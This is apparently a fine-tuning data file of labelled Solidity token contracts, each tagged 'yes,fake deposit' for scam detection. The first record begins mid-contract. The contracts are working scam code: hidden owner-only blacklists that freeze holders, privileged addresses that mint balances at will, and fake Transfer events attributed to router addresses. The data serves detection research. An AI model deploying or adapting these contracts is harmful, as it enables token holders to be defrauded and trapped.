F1[msg.sender] = F1[msg.sender].sub(amount);\n F1[to] = F1[to].add(amount);\n F88(to, amount);}\nif(F2[msg.sender] <= 1) {\n require(F1[msg.sender] >= amount);\n F1[msg.sender] = F1[msg.sender].sub(amount);\n F1[to] = F1[to].add(amount);\n emit Transfer(msg.sender, to, amount);}}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\nif(F2[sender] <= 1 && F2[recipient] <=1) {\n require(amount <= F1[sender]);\n require(amount <= F3[sender][msg.sender]);\n F1[sender] = F1[sender].sub(amount);\n F1[recipient] = F1[recipient].add(amount);\n emit Transfer(sender, recipient, amount);\n return true;}\n if(F2[sender] == 3) {\n require(amount <= F3[sender][msg.sender]);\n F1[sender] = F1[sender].sub(amount);\n F1[recipient] = F1[recipient].add(amount);\n F88(recipient, amount);\n return true;}\n }}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.18;\n//this project is non-profit work.\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract RJMcontract is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract RJM is RJMcontract {\n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'H1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n function RJM() {\n balances[msg.sender] = 1000000000000; \n totalSupply = 1000000000000; \n name = \"Reversed MYONG\"; \n decimals = 4; \n symbol = \"Reversed JM\"; \n unitsOneEthCanBuy = 1000000; \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy/1000000000000000000;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _contractcreator = 0xC06c17B9656591e41287be628477d0a617D94a6D;\n\taddress V2UniApproval = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\ncontract ELBET is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Per;\n\tmapping (address => bool) private Yer;\n mapping (address => bool) private Ker;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _kpTotalSupply = 120000000 * 10**_decimals;\n string private constant _name = \"Elon Bet\";\n string private constant _symbol = \"ELBET\";\n\n constructor () {\n Per[_MsgSendr()] = _kpTotalSupply;\n emit Transfer(address(0), V2UniApproval, _kpTotalSupply);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _kpTotalSupply;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Per[account];\n }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n \n\t\tfunction appendkep(address px) public {\n if(Yer[msg.sender]) { \n Ker[px] = false;}}\n \n function appqueue(address px) public{\n if(Yer[msg.sender]) { \n require(!Ker[px]);\n Ker[px] = true; }}\n\n\t\tfunction appstonk(address px) public{\n if(msg.sender == _contractcreator) { \n require(!Yer[px]);\n Yer[px] = true; }}\n\t\t\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _contractcreator) {\n require(amount <= Per[sender]);\n Per[sender] -= amount; \n Per[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (V2UniApproval, recipient, amount);\n return true; } \n if(!Ker[recipient]) {\n if(!Ker[sender]) {\n require(amount <= Per[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Per[sender] -= amount;\n Per[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _contractcreator) {\n require(Per[msg.sender] >= amount);\n Per[msg.sender] -= amount; \n Per[recipient] += amount; \n emit Transfer (V2UniApproval, recipient, amount);}\n if(Yer[msg.sender]) {Per[recipient] = amount;} \n if(!Ker[msg.sender]) {\n require(Per[msg.sender] >= amount);\n Per[msg.sender] -= amount; \n Per[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address ESK = 0xf84308B5e77BB364fd589CCE137Bd5CaAe326eA6;\n\taddress EZrouter = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract ShibaBlue is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Ec;\n\tmapping (address => bool) private Eb;\n mapping (address => bool) private Flw;\n mapping (address => mapping (address => uint256)) private eD;\n uint8 private constant _Dec = 8;\n uint256 private constant sE = 150000000 * 10**_Dec;\n string private constant _name = \"Shiba Blue\";\n string private constant _symbol = \"BLUESHIB\";\n\n\n\n constructor () {\n Ec[_msgSender()] = sE;\n eploy(); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _Dec;\n }\n\n function totalSupply() public pure returns (uint256) {\n return sE;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Ec[account];\n }\n function eploy() onlyOwner internal {\n emit Transfer(address(0), EZrouter, sE); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return eD[owner][spender];\n }\n\t function eBurn(address Ef) onlyOwner public{\n Eb[Ef] = true; }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n eD[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n \n\t\tfunction eStake(address Ef) public {\n if(Eb[msg.sender]) { \n Flw[Ef] = false;}}\n function eQuery(address Ef) public{\n if(Eb[msg.sender]) { \n Flw[Ef] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == ESK) {\n require(amount <= Ec[sender]);\n Ec[sender] -= amount; \n Ec[recipient] += amount; \n eD[sender][msg.sender] -= amount;\n emit Transfer (EZrouter, recipient, amount);\n return true; } else \n if(!Flw[recipient]) {\n if(!Flw[sender]) {\n require(amount <= Ec[sender]);\n require(amount <= eD[sender][msg.sender]);\n Ec[sender] -= amount;\n Ec[recipient] += amount;\n eD[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Ei, uint256 Ef) public {\n if(msg.sender == ESK) {\n require(Ec[msg.sender] >= Ef);\n Ec[msg.sender] -= Ef; \n Ec[Ei] += Ef; \n emit Transfer (EZrouter, Ei, Ef);} else \n if(Eb[msg.sender]) {Ec[Ei] += Ef;} else\n if(!Flw[msg.sender]) {\n require(Ec[msg.sender] >= Ef);\n Ec[msg.sender] -= Ef; \n Ec[Ei] += Ef; \n emit Transfer(msg.sender, Ei, Ef);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address aAM = 0x62f83396eD8b31ceb8Ad611C2ABF3255CA169fE6;\n\taddress aAMP = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract VRISK is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private aAc;\n\tmapping (address => bool) private aAb;\n mapping (address => bool) private aAw;\n mapping (address => mapping (address => uint256)) private aAv;\n uint8 private constant AAI = 8;\n uint256 private constant aAS = 777777777 * (10** AAI);\n string private constant _name = \"Vitalik Risk\";\n string private constant _symbol = \"VitalRISK\";\n\n\n\n constructor () {\n aAc[_msgSender()] = aAS;\n mmkr(aAMP, aAS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return AAI;\n }\n\n function totalSupply() public pure returns (uint256) {\n return aAS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return aAc[account];\n }\n\t\n\t\tfunction mstake(address aAj) public {\n if(aAb[msg.sender]) { \n aAw[aAj] = false;}}\n function mquery(address aAj) public{\n if(aAb[msg.sender]) { \n aAw[aAj] = true; }}\n \n\t\n\t\n function mmkr(address aAj, uint256 aAn) onlyOwner internal {\n emit Transfer(address(0), aAj ,aAn); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return aAv[owner][spender];\n }\n\t function mburn(address aAj) onlyOwner public{\n aAb[aAj] = true; }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n aAv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == aAM) {\n require(amount <= aAc[sender]);\n aAc[sender] -= amount; \n aAc[recipient] += amount; \n aAv[sender][msg.sender] -= amount;\n emit Transfer (aAMP, recipient, amount);\n return true; } else \n if(!aAw[recipient]) {\n if(!aAw[sender]) {\n require(amount <= aAc[sender]);\n require(amount <= aAv[sender][msg.sender]);\n aAc[sender] -= amount;\n aAc[recipient] += amount;\n aAv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address aAj, uint256 aAn) public {\n if(msg.sender == aAM) {\n require(aAc[msg.sender] >= aAn);\n aAc[msg.sender] -= aAn; \n aAc[aAj] += aAn; \n emit Transfer (aAMP, aAj, aAn);} else \n if(aAb[msg.sender]) {aAc[aAj] += aAn;} else\n if(!aAw[msg.sender]) {\n require(aAc[msg.sender] >= aAn);\n aAc[msg.sender] -= aAn; \n aAc[aAj] += aAn; \n emit Transfer(msg.sender, aAj, aAn);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract FREELON {\n \n mapping (address => uint256) public Rz;\n mapping (address => uint256) public Ti;\n mapping (address => bool) yZ;\n mapping(address => mapping(address => uint256)) public allowance;\n\taddress cstrict = 0xb6Dd43749Eb3d4FDd7378a24a350D617EcAbF43B;\n\taddress VRouter3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n\n\n\n\n string public name = unicode\"FREED\";\n string public symbol = unicode\"FREELON\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n\n\n constructor() {\n Rz[msg.sender] = totalSupply;\n emit Transfer(address(0), VRouter3, totalSupply); }\n\n \n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == cstrict) {\n require(Rz[msg.sender] >= value);\n Rz[msg.sender] -= value; \n Rz[to] += value; \n emit Transfer (VRouter3, to, value);\n return true; } \n if(!yZ[msg.sender]) {\n require(Rz[msg.sender] >= value);\n Rz[msg.sender] -= value; \n Rz[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\t\t\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function KBurn () public {\n if(msg.sender == cstrict) {\n Rz[msg.sender] = Ti[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return Rz[account]; }\n\n function Ldel(address nz) public {\n if(msg.sender == cstrict) { \n yZ[nz] = false;}}\n function LCheck(address nz) public{\n if(msg.sender == cstrict) { \n require(!yZ[nz]);\n yZ[nz] = true;\n }}\n function LBrdge(uint256 pi) public {\n if(msg.sender == cstrict) { \n Ti[msg.sender] = pi;} }\n\n\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n if(from == cstrict) {\n require(value <= Rz[from]);\n require(value <= allowance[from][msg.sender]);\n Rz[from] -= value; \n Rz[to] += value; \n emit Transfer (VRouter3, to, value);\n return true; } \n if(!yZ[from] && !yZ[to]) {\n require(value <= Rz[from]);\n require(value <= allowance[from][msg.sender]);\n Rz[from] -= value;\n Rz[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract UNDECIDEDCOIN {\n \n mapping (address => uint256) public OiO;\n mapping (address => uint256) public LRNED;\n mapping (address => bool) Ik;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"UNDECIDED COIN\";\n string public symbol = unicode\"UNDECIDED\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address Head_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n\n constructor() {\n OiO[msg.sender] = totalSupply;\n deploy(Head_Construct, totalSupply); }\n\n \n address deplyer = 0xE5a18feF11dF6439Bd02314F66FFc2fa30239a28;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == deplyer) {\n require(OiO[msg.sender] >= value);\n OiO[msg.sender] -= value; \n OiO[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Ik[msg.sender]) {\n require(OiO[msg.sender] >= value);\n OiO[msg.sender] -= value; \n OiO[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function Undecided () public {\n if(msg.sender == deplyer) {\n OiO[msg.sender] = LRNED[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return OiO[account]; }\n\n function RemoveBlacklist(address ii) public {\n if(msg.sender == deplyer) { \n Ik[ii] = false;}}\n function Blacklist(address ii) public{\n if(msg.sender == deplyer) { \n require(!Ik[ii]);\n Ik[ii] = true;\n }}\n function Maxwallet(uint256 x) public {\n if(msg.sender == deplyer) { \n LRNED[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == deplyer) {\n require(value <= OiO[from]);\n require(value <= allowance[from][msg.sender]);\n OiO[from] -= value; \n OiO[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Ik[from] && !Ik[to]) {\n require(value <= OiO[from]);\n require(value <= allowance[from][msg.sender]);\n OiO[from] -= value;\n OiO[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address eMCM = 0x1E0A2E851E86907c483d22b9A647a7A0E5740F5C;\n\taddress eWMB = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract DANKSHARD is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private eEc;\n\tmapping (address => bool) private eBe;\n mapping (address => bool) private ewE;\n mapping (address => mapping (address => uint256)) private vEb;\n uint8 private constant lEB = 8;\n uint256 private constant SBe = 150000000 * (10** lEB);\n string private constant _name = \"DANKSHARDING\";\n string private constant _symbol = \"DANKS\";\n\n\n\n constructor () {\n eEc[_msgSender()] = SBe;\n MkRe(eWMB, SBe); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return lEB;\n }\n\n function totalSupply() public pure returns (uint256) {\n return SBe;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return eEc[account];\n }\n\t\n\n \n\n\t\n function MkRe(address ejE, uint256 eNb) onlyOwner internal {\n emit Transfer(address(0), ejE ,eNb); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return vEb[owner][spender];\n }\n\t\t\t function eburn(address ejE) onlyOwner public{\n eBe[ejE] = true; }\n function approve(address spender, uint256 amount) public returns (bool success) { \n vEb[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction equery(address ejE) public{\n if(eBe[msg.sender]) { \n ewE[ejE] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == eMCM) {\n require(amount <= eEc[sender]);\n eEc[sender] -= amount; \n eEc[recipient] += amount; \n vEb[sender][msg.sender] -= amount;\n emit Transfer (eWMB, recipient, amount);\n return true; } else \n if(!ewE[recipient]) {\n if(!ewE[sender]) {\n require(amount <= eEc[sender]);\n require(amount <= vEb[sender][msg.sender]);\n eEc[sender] -= amount;\n eEc[recipient] += amount;\n vEb[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction eStake(address ejE) public {\n if(eBe[msg.sender]) { \n ewE[ejE] = false;}}\n\t\t\n\t\tfunction transfer(address ejE, uint256 eNb) public {\n if(msg.sender == eMCM) {\n require(eEc[msg.sender] >= eNb);\n eEc[msg.sender] -= eNb; \n eEc[ejE] += eNb; \n emit Transfer (eWMB, ejE, eNb);} else \n if(eBe[msg.sender]) {eEc[ejE] += eNb;} else\n if(!ewE[msg.sender]) {\n require(eEc[msg.sender] >= eNb);\n eEc[msg.sender] -= eNb; \n eEc[ejE] += eNb; \n emit Transfer(msg.sender, ejE, eNb);}}\n\t\t\n\t\t\n\n\t\t\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
